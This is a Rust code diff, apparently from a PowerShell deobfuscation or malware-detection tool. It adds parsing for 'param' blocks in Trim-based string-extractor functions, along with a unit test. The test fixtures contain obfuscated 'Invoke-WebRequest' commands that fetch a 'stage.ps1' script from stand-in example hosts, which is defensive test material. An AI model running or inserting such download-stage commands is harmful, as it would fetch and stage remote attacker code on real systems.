@@ -3402,30 +3402,59 @@ fn literal_substring_extractor_defs(text: &str) -> Vec<(String, String, String)>
             continue;
         };
         let mut pos = skip_ascii_ws(bytes, full.end());
-        if bytes.get(pos) != Some(&b'(') {
-            continue;
-        }
-        let Some(params_end) = text[pos + 1..].find(')').map(|rel| pos + 1 + rel) else {
+        let (params, block_open) = if bytes.get(pos) == Some(&b'(') {
+            let Some(params_end) = text[pos + 1..].find(')').map(|rel| pos + 1 + rel) else {
+                continue;
+            };
+            let params = text[pos + 1..params_end].to_string();
+            if params.len() > 256 {
+                continue;
+            }
+            pos = skip_ascii_ws(bytes, params_end + 1);
+            if bytes.get(pos) != Some(&b'{') {
+                continue;
+            }
+            (params, pos)
+        } else if bytes.get(pos) == Some(&b'{') {
+            let Some(body_end) = find_simple_ps_block_end(text, pos, 4096) else {
+                continue;
+            };
+            let body = &text[pos + 1..body_end];
+            let Some(params) = parse_leading_ps_param_block(body) else {
+                continue;
+            };
+            (params, pos)
+        } else {
             continue;
         };
-        let params = text[pos + 1..params_end].to_string();
-        if params.len() > 256 {
-            continue;
-        }
-        pos = skip_ascii_ws(bytes, params_end + 1);
-        if bytes.get(pos) != Some(&b'{') {
-            continue;
-        }
-        let Some(body_end) = find_simple_ps_block_end(text, pos, 4096) else {
+        let Some(body_end) = find_simple_ps_block_end(text, block_open, 4096) else {
             continue;
         };
         defs.push((
             name.to_string(),
             params,
-            text[pos + 1..body_end].to_string(),
+            text[block_open + 1..body_end].to_string(),
         ));
     }
     defs
+}
+
+fn parse_leading_ps_param_block(body: &str) -> Option<String> {
+    let bytes = body.as_bytes();
+    let pos = skip_ascii_ws(bytes, 0);
+    let keyword_end = pos.checked_add(5)?;
+    if !body.get(pos..keyword_end)?.eq_ignore_ascii_case("param")
+        || is_ident_byte(bytes.get(keyword_end).copied())
+    {
+        return None;
+    }
+    let open = skip_ascii_ws(bytes, keyword_end);
+    if bytes.get(open) != Some(&b'(') {
+        return None;
+    }
+    let params_end = body[open + 1..].find(')').map(|rel| open + 1 + rel)?;
+    let params = body[open + 1..params_end].to_string();
+    (params.len() <= 256).then_some(params)
 }
 
 fn find_simple_ps_block_end(text: &str, open: usize, max_len: usize) -> Option<usize> {
@@ -6576,6 +6605,24 @@ Clean '   Invoke-WebRequest -Uri https://ps-trim-noarg-extractor.example/stage.p
                 "'Invoke-WebRequest -Uri https://ps-trim-noarg-extractor.example/stage.ps1'"
             ),
             "no-arg trim extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_param_block_trim_extractor_call_is_rewritten() {
+        let text = r#"function Clean {
+  param($value,$chars)
+  return $value.Trim($chars)
+}
+Clean '~~~Invoke-WebRequest -Uri https://ps-param-block-extractor.example/stage.ps1~~~' '~'"#;
+
+        let out = expand_literal_trim_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-param-block-extractor.example/stage.ps1'"
+            ),
+            "param-block trim extractor call was not rewritten:\n{out}"
         );
     }
 
